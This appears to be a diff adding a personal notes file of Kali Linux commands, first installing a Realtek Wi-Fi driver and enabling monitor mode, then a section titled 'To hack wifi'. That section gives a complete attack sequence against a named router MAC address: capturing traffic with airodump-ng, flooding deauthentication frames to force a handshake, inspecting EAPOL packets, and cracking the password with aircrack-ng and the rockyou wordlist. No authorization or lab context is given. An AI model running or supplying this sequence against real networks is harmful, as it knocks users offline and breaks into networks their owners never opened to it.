@@ -1,0 +1,53 @@
+!Linux Version:- 
+!==============
+
+Linux kali 5.10.0-kali8-amd64 #1 SMP Debian 5.10.40-1kali1 (2021-05-31) x86_64 GNU/Linux
+
+lsusb
+sudo apt update
+sudo apt upgrade
+sudo apt install bc
+sudo apt-get install build-essential 
+sudo apt-get install libelf-dev 
+!Try either of these commands to see which works:
+sudo apt-get install linux-headers-`uname -r`
+sudo apt-get install linux-headers-5.10.0-kali6-amd64
+sudo apt install dkms
+sudo rmmod r8188eu.ko
+git clone https://github.com/aircrack-ng/rtl8188eus
+cd rtl8188eus
+sudo -i
+echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
+exit
+
+sudo reboot
+sudo apt update
+cd rtl8188eus
+sudo make
+sudo make install
+sudo modprobe 8188eu
+
+!To enable Monitor mode and test packet injection:
+!=================================================
+sudo ifconfig wlan0 down
+sudo airmon-ng check kill
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+iwconfig                             
+sudo aireplay-ng --test wlan0
+
+!To hack wifi :
+!==============
+sudo airodump-ng wlan0 
+sudo airodump-ng wlan0 -d 14:A7:2B:70:81:FC(router mac addr)
+sudo airodump-ng -w hack1 -c 8 --bssid 14:A7:2B:70:81:FC wlan0 (router mac addr)
+sudo aireplay-ng --deauth 0 -a 14:A7:2B:70:81:FC wlan0 (router mac addr)
+
+!wireshark :-
+!============
+wireshark hack1-01.cap 
+eapol
+
+!crack wifi pass:-
+!==================
+sudo aircrack-ng hack1-01.cap -w /usr/share/wordlist/rockyou.txt
